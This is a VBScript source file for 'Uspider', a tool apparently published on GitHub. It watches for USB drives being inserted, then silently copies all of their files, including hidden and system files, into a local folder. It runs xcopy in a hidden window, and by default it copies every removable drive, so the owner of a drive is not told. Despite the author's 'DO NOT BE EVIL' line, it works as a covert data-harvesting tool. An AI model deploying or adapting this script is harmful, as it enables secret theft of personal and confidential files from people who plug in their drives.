' Uspider v1.3.3 by jimmy19990
' ==========================
' With great might comes great responsibility. DO NOT BE EVIL.
' URL: https://github.com/jimmy19990/USpider.vbs
'
' -------------------
' Configurations
' -------------------
'
' Logging
'
' Set this option to "true" if you want logs.
'
private const logging = false
'
' Destination Folder
'
' "destFolder" defines the destination folder where Uspider will store the copied files.
private const destFolder = "D:\USpider"

' "separateFolders" tells Uspider whether you would like to store files from different devices into different subfolders.
' The subfolders will be named of the device's Volume Serial Number (obtained from Win32_LogicalDisk Class).
private const separateFolders = true

' Xcopy Parameters
'
' You can set whatever parameters you want to use with xcopy.
' Execute "xcopy /?" in Command Prompt for more information.
private const xcopyParameters = "/e /r /y /h"

' Custom List
'
' Uspider allows you to create custom lists to include/exclude certain devices.
' 
' "isBlacklist" defines the type of the list.
' Set it to "true" if you want a Black List, so that ONLY files inside the listed devices WILL BE copied.
' Set it to "false" if you want a White List, so that files inside the listed devices will NOT be copied.
private const isBlackList = false

' "customList" is an array which stores the Volume Serial Number.
' "VolumeSerialNumber" is declared in "Win32_LogicalDisk" Class.
' You can use a simple script I created (getVolumeSN.vbs) to obtain Volume Serial Numbers for all of your devices.
' To learn more about "Win32_LogicalDisk", please visit: https://msdn.microsoft.com/en-us/library/aa394173(v=vs.85).aspx.
customList = array("")

'
' -------------------
' Main Script
' -------------------

' Initialize Objects
strComputer = "." 
Set objFileSystem = CreateObject("Scripting.FileSystemObject")
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set objWScriptShell = CreateObject("WScript.Shell")
Set colEvents = objWMIService.ExecNotificationQuery _
    ("Select * From __InstanceOperationEvent Within 10 Where " _
        & "TargetInstance isa 'Win32_LogicalDisk'")

' Initialize Destination Folder.
If objFileSystem.folderExists(destFolder) = false Then
    objFileSystem.CreateFolder destFolder
End If

' Initialize logging.
If logging = true Then
    If objFileSystem.FileExists("Uspider_log.txt") = false Then
        Set objLogFile = objFileSystem.CreateTextFile("Uspider_log.txt")
        objLogFile.Close
    End If
    
    Set objLogFile = objFileSystem.OpenTextFile("Uspider_log.txt", 8, True)
    
    objLogFile.Write("[" & Now & "] " & "Uspider is now started...") & vbcrlf
End If

Do While True
    Set objEvent = colEvents.NextEvent
    
    ' Check if the target device type is Removable Device (DriveType = 2).
    If objEvent.TargetInstance.DriveType = 2 Then
        Select Case objEvent.Path_.Class
            ' Insert
            Case "__InstanceCreationEvent"
            
                If logging = true Then
                    objLogFile.Write("[" & Now & "] " & "New Device Inserted. DeviceID: " & objEvent.TargetInstance.DeviceId & _
                    " | Label: " & objEvent.TargetInstance.VolumeName & " | SN:" & objEvent.TargetInstance.VolumeSerialNumber) & vbcrlf
                End If
                
                ' Check if the device is in custom list.
                isIncluded = false
                If VarType(customList) = 8204 Then
                    If InStr(Join(customList, "|"), objEvent.TargetInstance.VolumeSerialNumber) > 0 Then
                        isIncluded = true
                    End If
                    If logging = true Then
                        objLogFile.Write("[" & Now & "] " & "isIncluded = " & isIncluded) & vbcrlf
                    End If
                End If
                
                If isIncluded = isBlackList Then
                    ' Initialize Work Folder.
                    If separateFolders = true Then
                        workFolder = destFolder + "\" + objEvent.TargetInstance.VolumeSerialNumber
                    Else
                        workFolder = destFolder
                    End If
                    
                    If objFileSystem.folderExists(workFolder) = false Then
                        objFileSystem.CreateFolder workFolder
                    End If
                    
                    ' Copy All Files.
                    copyCommand = "cmd.exe /c xcopy " + objEvent.TargetInstance.DeviceId + "\* " + workFolder + " " + xcopyParameters
                    objWScriptShell.Run(copyCommand), 0
                    If logging = true Then
                        objLogFile.Write("[" & Now & "] " & "Copying Thread Started. From " & objEvent.TargetInstance.DeviceId & "\ to " & workFolder) & vbcrlf
                    End If
                End If
                
            ' Remove
            Case "__InstanceDeletionEvent"
                If logging = true Then
                    objLogFile.Write("[" & Now & "] " & "Device Removed. DeviceID: " & objEvent.TargetInstance.DeviceId & _
                    " | Label: " & objEvent.TargetInstance.VolumeName & " | SN:" & objEvent.TargetInstance.VolumeSerialNumber) & vbcrlf
                End If 
        End Select
    End If
Loop
